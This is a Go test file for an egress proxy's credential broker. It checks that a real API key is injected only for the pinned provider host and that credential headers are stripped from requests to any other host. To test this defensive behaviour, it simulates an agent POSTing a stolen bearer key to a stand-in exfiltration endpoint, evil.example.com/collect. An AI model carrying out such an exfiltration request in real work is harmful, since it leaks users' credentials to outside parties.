package egressproxy

import (
	"net"
	"net/http"
	"net/url"
	"sync"
	"testing"
	"time"

	"github.com/proveo-ca/proveo/internal/broker"
)

// recordingTransport captures the request the proxy would send upstream (after
// the broker modifier has run) and returns a canned 200 — so the test asserts
// exactly what leaves the proxy, per destination host.
type recordingTransport struct {
	mu  sync.Mutex
	got map[string]http.Header // host -> outbound headers
}

func (rt *recordingTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	rt.mu.Lock()
	if rt.got == nil {
		rt.got = map[string]http.Header{}
	}
	rt.got[req.URL.Hostname()] = req.Header.Clone()
	rt.mu.Unlock()
	return &http.Response{
		StatusCode: http.StatusOK,
		Body:       http.NoBody,
		Request:    req,
		Header:     http.Header{},
		ProtoMajor: 1, ProtoMinor: 1,
	}, nil
}

func (rt *recordingTransport) headers(host string) http.Header {
	rt.mu.Lock()
	defer rt.mu.Unlock()
	return rt.got[host]
}

// TestBrokerThroughProxy drives real HTTP requests through the assembled martian
// proxy and asserts the credential broker end-to-end: the pinned provider host
// receives the injected credential; every other host has its credential headers
// stripped. This exercises the full modifier chain, not just broker.Apply.
func TestBrokerThroughProxy(t *testing.T) {
	p, _, closer, err := build(Config{
		Broker: broker.Config{
			Hosts:  []string{".anthropic.com"},
			Header: "x-api-key",
			Value:  "sk-ant-REAL",
			Strip:  broker.DefaultStripHeaders,
		},
	})
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	defer closer()

	rec := &recordingTransport{}
	p.SetRoundTripper(rec)

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	go func() { _ = p.Serve(ln) }()
	t.Cleanup(func() { _ = ln.Close() })

	proxyURL, _ := url.Parse("http://" + ln.Addr().String())
	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)},
	}

	do := func(rawurl string, headers map[string]string) {
		t.Helper()
		req, err := http.NewRequest(http.MethodPost, rawurl, nil)
		if err != nil {
			t.Fatalf("NewRequest(%s): %v", rawurl, err)
		}
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("client.Do(%s): %v", rawurl, err)
		}
		resp.Body.Close() //nolint:errcheck // best-effort body drain before next request
	}

	// The agent sends a sentinel to the provider and a stolen key to an exfil host.
	do("http://api.anthropic.com/v1/messages", map[string]string{"x-api-key": "sentinel"})
	do("http://evil.example.com/collect", map[string]string{"authorization": "Bearer sk-ant-REAL", "content-type": "application/json"})

	// Provider host: the broker's real credential replaced the sentinel.
	if got := rec.headers("api.anthropic.com"); got == nil {
		t.Fatal("no request recorded for provider host api.anthropic.com")
	} else if v := got.Get("x-api-key"); v != "sk-ant-REAL" {
		t.Errorf("provider host x-api-key = %q, want the injected sk-ant-REAL", v)
	}

	// Exfil host: credential header stripped, benign header preserved.
	if got := rec.headers("evil.example.com"); got == nil {
		t.Fatal("no request recorded for evil.example.com")
	} else {
		if v := got.Get("authorization"); v != "" {
			t.Errorf("off-provider authorization = %q, want it stripped", v)
		}
		if v := got.Get("content-type"); v != "application/json" {
			t.Errorf("off-provider content-type = %q, want it preserved", v)
		}
	}
}
